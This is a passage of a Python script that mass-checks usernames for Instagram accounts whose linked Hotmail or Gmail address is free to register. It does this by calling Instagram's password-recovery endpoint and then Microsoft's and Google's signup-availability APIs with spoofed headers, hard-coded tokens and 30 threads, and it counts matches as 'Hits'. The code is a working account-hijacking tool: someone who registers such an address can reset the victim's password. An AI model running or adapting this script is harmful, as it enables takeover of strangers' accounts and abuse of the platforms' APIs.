                                'uaid': f'936f243a-6a6d-49c2-8f6f-5a6a5a5a5a5a',
                                'includeSuggestions': True,
                                'uiflvr': 1001,
                                'scid': 100118,
                                'hpgid': 200639,
                            }
            res = requests.post('https://signup.live.com/API/CheckAvailableSigninNames',params=params,cookies=cookies,headers=headers,json=data,).text
            if 'isAvailable":true' in res:
               username,jj=email.split('@')
               info(username,jj)
            else:bads_email+=1
 def cheeck(email):
  global bads_instgram,hits,bads_email
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('00')
    b = random.randint(5,208)
    bo = f'\x1b[38;5;{b}m'
    bi = random.randint(5,208)
    bos = f'\x1b[38;5;{bi}m'
    if pp == '0':
        headers = {
                        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
        data = {
        f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
        'ig_sig_key_version': '4',
    }
        respon = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
        if '"status":"ok"' in respon:hott(email)
        else:bads_instgram+=1
  except:''
  bi = random.randint(5,208)
  bos = f'\x1b[38;5;{bi}m'
  sys.stdout.write(f'''\r{bos}[{r}{bbo}{n} 𝐅𝟏 {bos}{r} {bbo}{n}Hits:{r} {bbo}{G}{hits} {n}Bad IG:{r}{bbo} {R}{bads_instgram} {r}{bbo}{n}Bad Email: {r}{bbo}{X}{bads_email}{r}{bbo}{r}{bos} ]  \r''')
 executor = ThreadPoolExecutor(max_workers=30)
 for username in list99:
    try:
      if '@' in username:username=username.split('@')[0]
      email = username + '@hotmail.com'
      executor.submit(cheeck, email)
    except:''
#------canary-----
if ik == 3:
 from requests import post as pp
 from user_agent import generate_user_agent as gg
 from random import choice as cc
 from random import randrange as rr
 import re
 yy='azertyuiopmlkjhgfdsqwxcvbn'
 ids=[]
 def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }
    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
 tll()
 def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)
#------canary-----
 def gmail(email):
  global bads_email
  try:
    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:''
 def checkk(email):
  global bads_instgram,hits,bads_email
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('00')
    b = random.randint(5,208)
    bo = f'\x1b[38;5;{b}m'
    bi = random.randint(5,208)
    bos = f'\x1b[38;5;{bi}m'
    if pp == '0':
        headers = {
                        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
        data = {
        f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
        'ig_sig_key_version': '4',
    }
        respon = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
        if '"status":"ok"' in respon:gmail(email)
        else:bads_instgram+=1
  except:''
  bi = random.randint(5,208)
  bos = f'\x1b[38;5;{bi}m'
  sys.stdout.write(f'''\r{bos}[{r}{bbo}{n} 𝐅𝟏 {bos}{r} {bbo}{n}True:{r} {bbo}{G}{hits} {n}Bad IG:{r}{bbo} {R}{bads_instgram} {r}{bbo}{n}Bad Email: {r}{bbo}{X}{bads_email}{r}{bbo}{r}{bos}]  \r''')
 executor = ThreadPoolExecutor(max_workers=30)
 for username in list99:
    try:
      if '@' in username:username=username.split('@')[0]
      email = username + '@gmail.com'
      executor.submit(checkk, email)
    except:''
else:''
